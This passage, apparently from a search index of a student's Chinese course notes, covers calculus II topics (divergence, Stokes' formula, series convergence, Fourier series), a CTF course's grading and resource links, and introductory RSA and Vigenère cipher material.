\u5904\u7684\u6563\u5ea6\uff0c\u8bb0\u4f5c\\(div\\ \\overrightarrow{A}(x,y,z)\\)</p> <p>\u5219\u9ad8\u65af\u516c\u5f0f\u53ef\u4ee5\u5199\u6210\u5982\u4e0b\uff1a</p> \\[ \\iiint_V div\\ \\overrightarrow{A}dV=\\iint_S\\overrightarrow{A}\\overrightarrow{dS} \\] <p>\u6563\u5ea6\u4e0e\u5750\u6807\u7cfb\u9009\u53d6\u65e0\u5173</p>"},{"location":"Courses/calculusII/integration/#_20","title":"\u6563\u5ea6\u573a\u7684\u7269\u7406\u610f\u4e49","text":"<p>\u5f53\u6d41\u901f\u4e3a \\(\\overrightarrow{A}\\) \u7684\u4e0d\u53ef\u538b\u7f29\u6d41\u4f53\uff0c\u7ecf\u8fc7\u5c01\u95ed\u66f2\u7ebfS\u7684\u6d41\u91cf\u662f \\(\\iint_S\\overrightarrow{A}\\overrightarrow{dS}\\)\uff0c\u5219 \\(div\\ \\overrightarrow{A}(M_0)\\) \u662f\u6d41\u91cf\u5bf9\u4f53\u79ef\u7684\u53d8\u5316\u7387\uff0c\u5e76\u79f0\u5b83\u4e3a \\(\\overrightarrow{A}\\) \u5728 \\(M_0\\) \u70b9\u7684\u6d41\u91cf\u5bc6\u5ea6</p> <ul> <li>\u82e5 \\(div\\ \\overrightarrow{A}(M_0)\\gt 0\\) \uff0c\u8bf4\u660e\u5728\u6bcf\u4e00\u5355\u4f4d\u65f6\u95f4\u5185\u90fd\u6709\u4e00\u5b9a\u6570\u91cf\u6d41\u4f53\u6d41\u51fa\u8fd9\u4e00\u70b9\uff0c\u5219\u79f0\u8fd9\u70b9\u4e3a\u6e90</li> <li>\u82e5 \\(div\\ \\overrightarrow{A}(M_0)\\lt 0\\) \uff0c\u8bf4\u660e\u6d41\u4f53\u5728\u8fd9\u4e00\u70b9\u88ab\u5438\u6536\uff0c\u5219\u79f0\u8fd9\u70b9\u4e3a\u6c47</li> <li>\u82e5\u5728\u5411\u91cf\u573a \\(\\overrightarrow{A}\\) \u4e2d\u6bcf\u4e00\u70b9\u90fd\u6709 \\(div\\ \\overrightarrow{A}(M_0)= 0\\) \uff0c\u5219\u79f0 \\(\\overrightarrow{A}\\) \u4e3a\u65e0\u6e90\u573a</li> </ul>"},{"location":"Courses/calculusII/integration/#_21","title":"\u63a8\u8bba","text":"<p>\u5982\u679c\u4ec5\u5728\u533a\u57df \\(V\\) \u4e2d\u67d0\u4e9b\u70b9(\u6216\u5b50\u533a\u57df)\u4e0a\uff0c\\(div\\ \\overrightarrow{A}\\ne 0\\) \u6216\u4e0d\u5b58\u5728\uff0c\u5176\u5b83\u7684\u70b9\u90fd\u6709 \\(div\\ \\overrightarrow{A}= 0\\) \uff0c\u5219\u901a\u8fc7\u5305\u56f4\u8fd9\u4e9b\u70b9\u6216\u5b50\u533a\u57df(\u79f0\u4e3a\u6d1e)\u7684 \\(V\\) \u5185\u4efb\u4e00\u5c01\u95ed\u66f2\u9762\u79ef\u5206(\u7269\u7406\u610f\u4e49\u6d41\u91cf)\u90fd\u662f\u76f8\u7b49\u7684\uff0c\u5373\u662f\u4e00\u4e2a\u5e38\u6570\u3002</p> <p></p>"},{"location":"Courses/calculusII/integration/#_22","title":"\u66f2\u9762\u53d8\u6362\u4e0b\u7684\u7b2c\u4e8c\u7c7b\u66f2\u9762\u79ef\u5206\u8ba1\u7b97","text":"\\[\\begin{gather} \u8bbe\u66f2\u9762S\u7684\u53c2\u6570\u65b9\u7a0b\u4e3a\\begin{cases}x=x(u,v) \\\\ y=y(u,v) \\\\ z=z(u,v)\\end{cases} \\\\ \u5219\\iint_S\\overrightarrow{A}\\overrightarrow{dS}=\\iint_ {\\sigma_{uv}} \\left | \\begin{matrix}P &amp; Q &amp; R  \\\\ x'_u &amp; y'_u &amp; z'_u \\\\ x'_v &amp; y'_v &amp; z'_v\\end{matrix} \\right | dudv \\end{gather} \\]"},{"location":"Courses/calculusII/integration/#_23","title":"\u65af\u6258\u514b\u65af\u516c\u5f0f","text":"\\[ \\oint_LPdx+Qdy+Rdz=\\iint_S(\\frac{\\partial R}{\\partial y}-\\frac{\\partial Q}{\\partial z})dydz+(\\frac{\\partial P}{\\partial z}-\\frac{\\partial R}{\\partial x})dzdx+(\\frac{\\partial Q}{\\partial x}-\\frac{\\partial P}{\\partial y})dxdy \\] <p>\u5176\u4e2d\uff0c\\(L\\) \u4e0e \\(S\\) \u4f9d\u9760\u53f3\u624b\u5b9a\u5219\u786e\u5b9a\u6b63\u5411\u3002</p> <p></p> <ul> <li>\u7531\u4e8e\u65af\u6258\u514b\u65af\u516c\u5f0f\u53d8\u6362\u800c\u6765\u7684\u7b2c\u4e8c\u7c7b\u66f2\u9762\u79ef\u5206\u4e0d\u4e00\u5b9a\u662f\u5c01\u95ed\u7684\uff0c\u66f4\u591a\u65f6\u5019\u9700\u8981\u6211\u4eec\u8fd0\u7528\u5b9a\u4e49\u53bb\u7b97\u79ef\u5206<ul> <li>\u5177\u4f53\u800c\u8a00\u5c31\u662f\u5c06 \\(\\overrightarrow{dS}\\) \u53d8\u6210 \\((\\cos\\alpha+\\cos\\beta+\\cos\\gamma)dS\\) \uff0c\u5176\u4e2d\u4e09\u89d2\u51fd\u6570\u6765\u6e90\u4e8e\u66f2\u9762\u7684\u6cd5\u5411\u91cf(\u65b9\u5411\u7531\u53f3\u624b\u5b9a\u5219\u786e\u5b9a) </li> </ul> </li> </ul>"},{"location":"Courses/calculusII/integration/#_24","title":"\u7a7a\u95f4\u66f2\u7ebf\u79ef\u5206\u7684\u8def\u5f84\u65e0\u5173\u6027","text":"<p>\u8bbe \\(\\Omega \\in R^3\\) \u4e3a\u7a7a\u95f4\u7ebf\u5355\u8fde\u901a\u533a\u57df\uff0c\u82e5\u51fd\u6570P,Q,R\u5728 \\(\\Omega\\) \u4e0a\u8fde\u7eed\uff0c\u4e14\u6709\u4e00\u9636\u8fde\u7eed\u504f\u5bfc\u6570\uff0c\u5219\u4e0b\u5217\u6761\u4ef6\u7b49\u4ef7\uff1a</p> <ul> <li>\u4e0d\u60f3\u5199\u4e86\uff0cGoodbye\uff0c\u795d\u4f60\u8003\u4e2a\u597d\u6210\u7ee9!</li> </ul>"},{"location":"Courses/calculusII/integration/#_25","title":"\u65cb\u5ea6\u573a","text":"<p>\u6b64\u90e8\u5206\u5185\u5bb9\u4e66\u672c\u4e0a\u6253\u661f\u53f7\u4e86\uff0c\u4f46\u662f\u8fd8\u662f\u8003\u5230\u8fc7</p> <p>\u8bbe \\(\\overrightarrow{A}(x,y,z)=\\{P(x,y,z),Q(x,y,z),R(x,y,z)\\}\\) \uff0c\u5b9a\u4e49\u5411\u91cf\u51fd\u6570 \\(\\overrightarrow{A}\\) \u5728 \\((x,y,z)\\) \u5904\u7684\u65cb\u5ea6\u4e3a:</p> \\[rot(\\overrightarrow{A})=(\\frac{\\partial R}{\\partial y}-\\frac{\\partial Q}{\\partial z},\\frac{\\partial P}{\\partial z}-\\frac{\\partial R}{\\partial x},\\frac{\\partial Q}{\\partial x}-\\frac{\\partial P}{\\partial y})\\] <p>\u3010\u5b9a\u4e49\u73af\u91cf\u5bc6\u5ea6\u3011</p> \\[\\begin{gather} \\mu =\\lim_{S\\rightarrow M}\\frac{\\oint_l \\overrightarrow{A}\\overrightarrow{ds}}{D}=\\lim_{S\\rightarrow M}\\frac{\\iint_S rot\\overrightarrow{A}\\overrightarrow{dS}}{D} \\\\ =\\lim_{S\\rightarrow M}\\frac{\\iint_S (rot\\overrightarrow{A}\\cdot \\overrightarrow{n_0}){dS}}{D} \\\\ \u4e2d\u503c\u5b9a\u7406 =(rot\\overrightarrow{A}\\cdot \\overrightarrow{n_0})_M\\ \\ M\u4e3aD\u5185\u4e00\u70b9  \\end{gather}\\] <p>\u5373\uff0c\u77e2\u91cf\u573a \\(\\overrightarrow{A}(M)\\) \u5728\u70b9 \\(M\\) \u5904\u7684\u73af\u91cf\u5bc6\u5ea6\u516c\u5f0f\u4e3a\uff1a</p> \\[ \\mu =rot \\overrightarrow{A}\\cdot n_0 = (\\frac{\\partial R}{\\partial y}-\\frac{\\partial Q}{\\partial z},\\frac{\\partial P}{\\partial z}-\\frac{\\partial R}{\\partial x},\\frac{\\partial Q}{\\partial x}-\\frac{\\partial P}{\\partial y})(\\cos \\alpha ,\\cos \\beta,\\cos\\gamma) \\]"},{"location":"Courses/calculusII/integration/#_26","title":"\u6309\u5b9a\u4e49\u6c42\u7b2c\u4e8c\u7c7b\u66f2\u9762\u79ef\u5206","text":"<p>\u9519\u9898!</p> <p></p> <p>\u53ea\u6709\u7b2c\u4e00\u6b65\u505a\u9519\u4e86\uff1a\u7b2c\u4e8c\u7c7b\u66f2\u7ebf\u79ef\u5206\u4e0d\u80fd\u968f\u4fbf\u53bb\u7edd\u5bf9\u503c\uff0c\u56e0\u6b64\u8fd9\u9898\u6b63\u786e\u505a\u6cd5\u4e3a\u4fdd\u7559\u7edd\u5bf9\u503c\uff0c\u7136\u540e\u518d\u6309\u5b9a\u4e49\u6c42\u3002</p> <p>\u7528\u5b9a\u4e49\u6c42\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u6ce8\u610f!</p> <p>\u6cd5\u5411\u91cf\u8981\u5355\u4f4d\u5316!</p> <p>\u6cd5\u5411\u91cf\u8981\u5355\u4f4d\u5316!</p> <p>\u6cd5\u5411\u91cf\u8981\u5355\u4f4d\u5316!</p>"},{"location":"Courses/calculusII/series/","title":"\u7ea7\u6570","text":""},{"location":"Courses/calculusII/series/#_1","title":"\u7ea7\u6570","text":"<p> \u7ea6 1152 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Quote</p> <p></p> <ul> <li>\u53e6\u5916\u8865\u5145\u4e00\u4e2a \\(\\arctan x=\\sum_{n=0}^\\infty (-1)^n\\frac{x^{2n+1}}{2n+1}\\)</li> </ul>"},{"location":"Courses/calculusII/series/#_2","title":"\u67ef\u897f\u6536\u655b\u51c6\u5219","text":"\\[\\begin{gather} \\forall \\varepsilon \\gt 0,\\exists N,\u5f53n\\gt N\u65f6,\u5bf9\u4e00\u5207\u81ea\u7136\u6570P\u90fd\u6709 \\\\ |U_{n+1}+ U_{n+2}+...+U_{n+P}|\\lt \\varepsilon \\end{gather} \\] <p>\u7531\u6b64\u9006\u5426\u547d\u9898\u5f97\u5230\u7ea7\u6570\u53d1\u6563\u7684\u5145\u8981\u6761\u4ef6 \u4e3a\uff1a</p> \\[ \\begin{gather} \\exists \\varepsilon_0 \\gt 0,\\forall N,\\exists n\\gt N\u65f6,\\exists P\\in Z^+\u90fd\u6709 \\\\ |U_{n+1}+ U_{n+2}+...+U_{n+P}|\\ge \\varepsilon_0 \\end{gather} \\]"},{"location":"Courses/calculusII/series/#_3","title":"\u83b1\u5e03\u5c3c\u8328\u5b9a\u7406\u53ca\u5176\u8bc1\u660e","text":"<p>\u82e5\u4ea4\u9519\u7ea7\u6570 \\(\\sum_{n=1}^\\infty (-1)^nu_n\\) \u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\uff1a</p> <ol> <li>\\(u_1\\ge u_2 \\ge u_3\\ge ... \\ge 0\\)</li> <li>\\(\\lim_{n\\rightarrow \\infty}{u_n}=0\\)</li> </ol> <p>\u5219 \\(\\sum_{n=1}^\\infty (-1)^nu_n\\) \u6536\u655b\uff0c\u5e76\u4e14\u5b83\u7684\u548c \\(S\\le u_1\\) \uff1b\u4ee5 \\(S_n\\) \u4e3a\u7ea7\u6570\u548c\u7684\u8fd1\u4f3c\u503c\u65f6\uff0c\u5176\u8bef\u5dee \\(R_n\\) \u4e0d\u8d85\u8fc7 \\(u_{n+1}\\) \uff0c\u5373 \\(|R_n|=|S- S_n|\\le u_{n+1}\\)</p> <p>\u3010Prove\u3011</p> \\[\\begin{array}c 0\\le S_{2m}=(u_1-u _2)+(u _3-u _4)+...+(u _{2m-1}-u _{2m}) \\\\ S_{2m+2}=S _{2m}+( u_{2m+1}- u_{2m+2}) \\ge S_{2m} \\\\ \u5e76\u4e14S_{2m}=u_1-(u _2- u _3)-...-(u _{2m-2}-u _{2m-1})-u _{2m}\\le u_1 \\\\ \u5373\u6570\u5217 S_{2m} \u5355\u8c03\u9012\u589e\u6709\u4e0a\u754c\uff0c\u6240\u4ee5\u5176\u6781\u9650\u5b58\u5728\uff0c\u8bb0\u4e3a S \\\\ \u5219 \\lim_{m\\rightarrow\\infty} S_{2m+1}= \\lim_{m\\rightarrow\\infty} (S_{2m}+u _{2m+1})=S+0 \\\\ \\Rightarrow \\ \\lim_{n\\rightarrow \\infty} S_n =S \\\\  \u7ea7\u6570\u6536\u655b \\end{array} \\]"},{"location":"Courses/calculusII/series/#ex","title":"\u6709\u9636\u4e58\u8003\u8651 \\(e^x\\)","text":"<p>\u65e0\u6570\u4e2a\u6709\u7406\u6570\u76f8\u52a0\u53ef\u4ee5\u662f\uff1a</p> <ul> <li>\u4e0d\u662f\u4e00\u4e2a\u6570\uff1a \\(\\sum n\\)</li> <li>\u6709\u7406\u6570\uff1a \\(\\sum\\frac{1}{2^n}\\)</li> <li>\u65e0\u7406\u6570\uff1a \\(\\sum\\frac{(-1)^n}{n}=\\ln 2\\)</li> </ul>"},{"location":"Courses/calculusII/series/#_4","title":"\u91cd\u8981\u7ea7\u6570","text":""},{"location":"Courses/calculusII/series/#_5","title":"\u63a8\u5e7f\u5224\u522b\u6cd5","text":""},{"location":"Courses/calculusII/series/#dirichlet","title":"Dirichlet \u5224\u522b\u6cd5","text":"<p>\u82e5\u6570\u5217 \\(\\{a_n\\}\\) \u5355\u8c03\u4e14 \\(\\lim_{n\\rightarrow\\infty}a _n=0\\) \uff0c\u7ea7\u6570 \\(\\sum_{n=1}^\\infty b_n\\) \u7684\u90e8\u5206\u548c\u6709\u754c\uff0c\u5219 \\(\\sum_{n=1}^\\infty a_n b_n\\) \u6536\u655b</p>"},{"location":"Courses/calculusII/series/#abel","title":"Abel \u5224\u522b\u6cd5","text":"<p>\u82e5\u6570\u5217 \\(\\{a_n\\}\\) \u5355\u8c03\u6709\u754c\uff0c\u7ea7\u6570 \\(\\sum_{n=1}^\\infty b_n\\) \u6536\u655b\uff0c\u5219 \\(\\sum_{n=1}^\\infty a_n b_n\\) \u6536\u655b</p> <p>Abel\u53d8\u6362</p> <p>\u4ee5\u4e0a\u4e24\u4e2a\u5b9a\u7406\u7684\u8bc1\u660e\u9700\u8981\u7528\u5230Abel\u53d8\u6362\uff1a \\(\\sum_{k=1}^{n} a_k b_k =a_n B_n + \\sum_{k=1}^{n-1} (a_k -a_{k+1}) B_k\\) \uff0c\u5176\u4e2d \\(B_k =\\sum_{n=1}^k b_n\\)</p> <p>\u6b64\u53d8\u6362\u8bc1\u660e\u8981\u70b9\u5728\u4e8e\u5c06 \\(b_k= B_k -B_{k_1}\\) \u4ee3\u5165</p>"},{"location":"Courses/calculusII/series/#_6","title":"\u6536\u655b\u534a\u5f84\u3001\u6536\u655b\u533a\u95f4\u3001\u6536\u655b\u57df","text":"<ul> <li>\\((-r,r)\\) \u4e3a \u6536\u655b\u533a\u95f4</li> <li>\\((-r,r)\\) \u52a0\u4e0a\u6536\u655b\u7aef\u70b9\u4e3a \u6536\u655b\u57df</li> </ul> <p>Info</p> <p>\u65e0\u9650\u591a\u4e2a\u8fde\u7eed\u51fd\u6570\u7684\u548c\u4e0d\u4e00\u5b9a\u662f\u8fde\u7eed\u51fd\u6570\uff0c\u4f8b\u5982\uff1a</p> <p>\\(S(x)=x+\\sum_{n=2}^\\infty (x^n-x ^{n-1})\\) \u5728 \\(x\\in (-1,1)\\) \u65f6\u7b49\u4e8e0\uff0c\u5728 \\(x=1\\) \u65f6\u7b49\u4e8e1</p> <p>\u6c42\u548c\u51fd\u6570\u8bf7\u6ce8\u610f!</p> <p>\u6c42\u548c\u51fd\u6570\u7684\u65f6\u5019\u4e00\u5b9a\u8bb0\u5f97\u4e13\u95e8\u6807\u6ce8\u4e0d\u5b58\u5728\u7684\u70b9\u3002\u4f8b\u5982\u5728\u6709 \\(1/x\\) \u7684\u65f6\u5019\uff0c\u8981\u5199\u51fa \\(S(x)\\) \u5728 \\(x=0\\) \u65f6\uff0c\u7b49\u4e8e 0\u3002</p>"},{"location":"Courses/calculusII/series/#_7","title":"\u5e42\u7ea7\u6570\u5c55\u5f00","text":"<p>\\(f(x)\\) \u5728\u533a\u95f4 \\(|x-x_0|\\lt R\\) \u5185\u5b58\u5728\u4efb\u610f\u9636\u5bfc\u6570\uff0c\u5e42\u7ea7\u6570 \\(\\sum_{n=0}^\\infty \\frac{f^{(n)}(x_0)}{n!}(x-x _0)^n\\) \u7684\u6536\u655b\u533a\u95f4\u4e3a \\(|x-x_o|\\lt R\\) \uff0c\u5219\u5728 \\(|x-x_o|\\lt R\\) \u5185\uff0c \\(f(x)=\\sum_{n=0}^\\infty \\frac{f^{(n)}(x_0)}{n!}(x-x _0)^n\\) \u7684\u5145\u8981\u6761\u4ef6\u662f\uff1a</p> \\[ \\lim_{n\\rightarrow \\infty} R_n(x) = \\lim_{n\\rightarrow \\infty} \\frac{f^{(n+1)}(\\varepsilon)}{(n+1)!}(x-x _0)^{n+1}=0 \\]"},{"location":"Courses/calculusII/series/#_8","title":"\u5e42\u7ea7\u6570\u5c55\u5f00\u7684\u6b65\u9aa4","text":"<ul> <li>Step 1: \u8ba1\u7b97 \\(f^{(n)}(x_0),n=1,2,3,...\\)</li> <li>Step 2: \u5199\u51fa\u5bf9\u5e94\u7684\u6cf0\u52d2\u7ea7\u6570 \\(\\sum_{n=0}^\\infty \\frac{f^{(n)}(x_0)}{n!}(x-x _0)^n\\) \uff0c\u5e76\u6c42\u51fa\u6536\u655b\u533a\u95f4</li> <li>Step 3: \u9a8c\u8bc1 \\(|x-x_0|\\lt R\\) \u65f6\uff0c\\(\\lim_{n\\rightarrow \\infty} R_n(x) =0\\)<ul> <li>\u7279\u522b\u5730\uff0c\\(\\lim_{n\\rightarrow \\infty} \\frac{|x|^{n+1}}{(n+1)!}=0\\)</li> </ul> </li> <li>Step 4: \\(f(x)=\\sum_{n=0}^\\infty \\frac{f^{(n)}(x_0)}{n!}(x-x _0)^n\\ \\ |x-x_o|\\lt R\\)</li> <li>Step 5: \u9a8c\u8bc1\u7aef\u70b9\u6536\u655b\u6027</li> </ul>"},{"location":"Courses/calculusII/series/#_9","title":"\u5085\u91cc\u53f6\u7ea7\u6570\u516c\u5f0f","text":"\\[\\begin{gather} a_n=\\frac{1}{l}\\int^l _{-l}f(x)\\cos \\frac{n\\pi x}{l}dx\\ \\ (n=0,1,2,...) \\\\ b_n=\\frac{1}{l} \\int^l_{-l}f(x)\\sin \\frac{n\\pi x}{l}dx\\ \\ (n=1,2,3,...) \\end{gather} \\]"},{"location":"Courses/calculusII/series/#_10","title":"\u5085\u91cc\u53f6\u5c55\u5f00\u7684\u6b65\u9aa4","text":"<ul> <li>Step 1: \u6c42\u51fa\u6700\u5c0f\u6b63\u5468\u671f T \u548c\u534a\u5468\u671f l</li> <li>Step 2: \u5224\u5b9a \\(f(x)\\) \u5947\u5076\u6027\uff0c\u7b80\u5316\u7cfb\u6570\u8ba1\u7b97\uff0c\u5e76\u6c42\u51fa \\(a_n\\ b_n\\)</li> <li>Step 3: \u5f97\u5230\u5085\u91cc\u53f6\u7ea7\u6570(\u6b64\u65f6\u8fd8\u4e0d\u80fd\u53d6\u7b49\uff0c\u7528 <code>~</code> \u8fde\u63a5)</li> <li>Step 4: \u5224\u5b9a\u6ee1\u8db3\u8fea\u5229\u514b\u96f7\u5b9a\u7406\u7684\u6761\u4ef6\uff08\\(f(x)\\) \u8fde\u7eed\u6216\u53ea\u6709\u6709\u9650\u4e2a\u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9\u4e0e\u6781\u503c\u70b9\uff09</li> </ul> <p>\u4e09\u89d2\u51fd\u6570\u5085\u91cc\u53f6\u5c55\u5f00\u5c31\u662f\u5b83\u81ea\u5df1</p> <p>\u4e2d\u5fc3\u70b9\u4e0d\u5728\u539f\u70b9\u4e5f\u6b63\u5e38\u6c42\u5373\u53ef</p> <p></p>"},{"location":"Courses/calculusII/series/#_11","title":"\u5e15\u585e\u74e6\u4e0d\u7b49\u5f0f","text":"<p>\u82e5 \\(f(x)\\) \u53ef\u79ef\u4e14\u5e73\u65b9\u53ef\u79ef\uff0c\u5219 \\(f(x)\\) \u7684\u5085\u91cc\u53f6\u7ea7\u6570\u7cfb\u6570 \\(a_n,b _n\\) \u7684\u5e73\u65b9\u6240\u6784\u6210\u7684\u7ea7\u6570 \\(\\frac{a_0^2}{2} +\\sum_{n=1}^\\infty (a_n^2 +b_n^2)\\) \u6536\u655b\uff0c\u4e14\u7b49\u4e8e \\(\\frac{1}{l} \\int^l_{-l} f^2(x)dx\\)</p>"},{"location":"Courses/calculusII/series/#_12","title":"\u5c55\u5f00\u4e3a\u5085\u91cc\u53f6\u7ea7\u6570\u540e\u518d\u6c42\u548c\u51fd\u6570\uff0c\u53ef\u80fd\u4e0e\u539f\u51fd\u6570\u5e76\u4e0d\u76f8\u540c","text":""},{"location":"Courses/calculusII/series/#_13","title":"\u4e00\u4e9b\u8bfe\u540e\u9898 &amp; \u5386\u5e74\u9898","text":""},{"location":"Courses/ctf/","title":"Index","text":"<p> \u7ea6 294 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u8bfe\u7a0b\u4ee5\u81ea\u5b66\u4e3a\u4e3b\uff0c\u5e76\u4e14\u4e3b\u8981\u8003\u5bdf\u7684\u5176\u5b9e\u5f88\u591a\u662f\u5de5\u5177\u7684\u5e94\u7528</p> <p>\u7531\u4e8e\u9898\u76ee\u89e3\u7b54\u9700\u8981\u4fdd\u5bc6\uff0c\u800c\u6211\u7684\u77e5\u8bc6\u5927\u90e8\u5206\u90fd\u4ece\u5199\u4f5c\u4e1a\u4e2d\u5f97\u6765\uff0c\u6240\u4ee5\u8fd9\u95e8\u8bfe\u6211\u7684\u7b14\u8bb0\u8d28\u91cf\u60f3\u5fc5\u4f1a\u6bd4\u8f83\u5dee</p> <p>\u7b14\u8bb0\u90e8\u5206\u6709\u76f8\u5f53\u591a\u5185\u5bb9\u90fd\u662f\u76f4\u63a5Copy\u7684\uff0c\u5e76\u6ca1\u6709\u7ecf\u8fc7\u6211\u592a\u591a\u4fee\u6539</p>"},{"location":"Courses/ctf/#_1","title":"\u7f51\u7ad9\u8d44\u6e90","text":"<ul> <li>CTF101-Labs-2024</li> <li>CTF Wiki</li> <li>\u5237\u9898\u7f51\u7ad9<ul> <li>ZJU School-Bus  \u9700\u8981\u5185\u7f51</li> <li>Hackergame</li> <li>\u653b\u9632\u4e16\u754c</li> </ul> </li> <li>\u300c\u5b9e\u7528\u6280\u80fd\u62fe\u9057\u300d\u7cfb\u5217\u8f85\u5b66\u8bfe\u7a0b\u7f51\u7ad9</li> <li>Black White's Homepage</li> <li>x86 \u6c47\u7f16\u8bed\u8a00 - \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c</li> <li>CyberChef \u7f16\u7801\u5999\u5999\u5de5\u5177()</li> <li>quipqiup \u8bcd\u9891\u5206\u6790\u7f51\u7ad9</li> <li>OneCompiler \u5728\u7ebf\u7f16\u8bd1\u7f51\u7ad9</li> </ul>"},{"location":"Courses/ctf/#_2","title":"\u8bc4\u5206\u6807\u51c6","text":"<ul> <li>Lab0 + 10 \u4e2a Lab1 \u6bcf\u4e2a 5% \uff0c\u5171 55%</li> <li>\u81ea\u9009\u4e24\u4e2a\u4e13\u9898\uff0c\u6bcf\u4e2a\u4e13\u9898\u4e24\u6b21 Lab \uff0c\u6bcf\u6b21 Lab 20%\uff0c\u5171 40%</li> <li>\u51fa\u52e4\u5206 5%</li> </ul> <p>\u6bcf\u4e2a Lab \u5176\u5b9e\u90fd\u6709 Bonus\uff0c\u4e0d\u8fc7 Lab1 \u548c Lab2 \u7684 Bouns \u4e0d\u76f8\u4e92\u6ea2\u51fa</p> <p>\u6700\u540e\u5206\u6570\u51fa\u6765\u4e86\uff0c\u5404\u4f4d\u52a9\u6559\u4e5f\u90fd\u662f\u5b66\u751f\uff0c\u80fd\u7ed9\u7684\u5206\u90fd\u4f1a\u5c3d\u91cf\u7ed9\u4f60\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u4e0d\u6284\u88ad\u8ba4\u771f\u5b8c\u6210\u6240\u6709 lab \u5c31\u5f88\u5bb9\u6613\u62ff\u6ee1\u7684\uff01</p> <p>\u91cd\u5728\u5b9e\u8df5\uff0c\u6240\u4ee5\u5176\u5b9e\u4f60\u770b\u6211\u5199\u7684\u8fd9\u4e9b\u70c2\u8bdd\u662f\u6ca1\u7528\u7684\uff08</p>"},{"location":"Courses/ctf/Crypto/","title":"Crypto \u57fa\u7840","text":""},{"location":"Courses/ctf/Crypto/#crypto","title":"Crypto \u57fa\u7840","text":"<p> \u7ea6 935 \u4e2a\u5b57  3 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>SageMath</p>"},{"location":"Courses/ctf/Crypto/#rsa","title":"RSA\u7b97\u6cd5","text":"<p>Quote</p> <p>RSA\u7b97\u6cd5\u57fa\u4e8e\u4e00\u4e2a\u5341\u5206\u7b80\u5355\u7684\u6570\u8bba\u4e8b\u5b9e\uff1a\u5c06\u4e24\u4e2a\u5927\u8d28\u6570\u76f8\u4e58\u5341\u5206\u5bb9\u6613\uff0c\u4f46\u662f\u60f3\u8981\u5bf9\u5176\u4e58\u79ef\u8fdb\u884c\u56e0\u5f0f\u5206\u89e3\u5374\u6781\u5176\u56f0\u96be\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06\u4e58\u79ef\u516c\u5f00\u4f5c\u4e3a\u52a0\u5bc6\u5bc6\u94a5\u3002</p> <ul> <li>\u5bf9\u79f0\u5bc6\u7801\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u79cd\u5bc6\u94a5\u7684\u65b9\u5f0f</li> <li>\u516c\u94a5\u5bc6\u7801\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u4f7f\u7528\u4e0d\u540c\u7684\u5bc6\u7801\u7684\u65b9\u5f0f\uff0c\u56e0\u6b64\u516c\u94a5\u5bc6\u7801\u901a\u5e38\u4e5f\u79f0\u4e3a\u975e\u5bf9\u79f0\u5bc6\u7801\u3002</li> </ul>"},{"location":"Courses/ctf/Crypto/#_1","title":"\u7b97\u6cd5\u63cf\u8ff0","text":"<ul> <li>\u5bc6\u94a5\u8ba1\u7b97\u65b9\u6cd5<ul> <li>\u4efb\u610f\u9009\u53d6\u4e24\u4e2a\u5927\u7d20\u6570p\u548cq</li> <li>\u8ba1\u7b97 \\(n=p\\times q\\) \u548c \\(z=(p-1)\\times (q-1)\\)  // \\(n\\) \u8868\u793a\u6b27\u62c9\u51fd\u6570</li> <li>\u627e\u5230\u4e00\u4e2a \\(e\\) \u6ee1\u8db3 \\(gcd(e,z)=1\\)  (\u6ce8\u610f\uff1ae\u7684\u9009\u53d6\u662f\u5f88\u5bb9\u6613\u7684\uff0c\u4f8b\u5982\uff0c\u6240\u6709\u5927\u4e8ep\u548cq\u7684\u7d20\u6570\u90fd\u53ef\u7528)</li> <li>\u786e\u5b9a\u89e3\u5bc6\u94a5 \\(d\\) \uff0c\u6ee1\u8db3 \\((de)\\mod z =1\\) </li> <li>\u5219\u516c\u5f00\u5bc6\u94a5\u4e3a \\((e,n)\\) \uff0c\u79c1\u6709\u5bc6\u94a5\u4e3a \\((d,n)\\)</li> </ul> </li> <li>\u52a0\u5bc6\u65b9\u6cd5<ul> <li>\\(\u5bc6\u6587=\u660e\u6587^e\\mod n\\)</li> </ul> </li> <li>\u89e3\u5bc6\u65b9\u6cd5<ul> <li>\\(\u660e\u6587=\u5bc6\u6587^d\\mod n\\)</li> </ul> </li> </ul> <p>Info</p> <p>\u53ea\u6839\u636e\u516c\u5f00\u5bc6\u94a5e,n\u8ba1\u7b97\u51fad\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u56e0\u6b64\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u5bf9\u660e\u6587\u8fdb\u884c\u52a0\u5bc6\uff0c\u4f46\u53ea\u6709\u6388\u6743\u7528\u6237\uff08\u77e5\u9053d\uff09\u624d\u53ef\u5bf9\u5bc6\u6587\u89e3\u5bc6</p>"},{"location":"Courses/ctf/Crypto/#vigenere","title":"Vigenere \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801","text":"<p>\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u662f\u591a\u8868\u5bc6\u7801\u7684\u4e00\u79cd\u7b80\u5355\u5f62\u5f0f\uff0c\u52a0\u5bc6\u5f3a\u5ea6\u76f8\u5bf9\u4e8e\u5355\u8868\u66ff\u6362\u5df2\u7ecf\u589e\u5f3a\u4e86\u8bb8\u591a\uff0c\u4f46\u662f\u4ecd\u7136\u4f1a\u56e0\u8bed\u8a00\u5b66\u7279\u6027\u88ab\u8f7b\u677e\u7834\u89e3\u3002</p> <p>\u52a0\u5bc6\u8868</p> <p></p> <p>\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50</p> <p><code>\u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto</code></p> 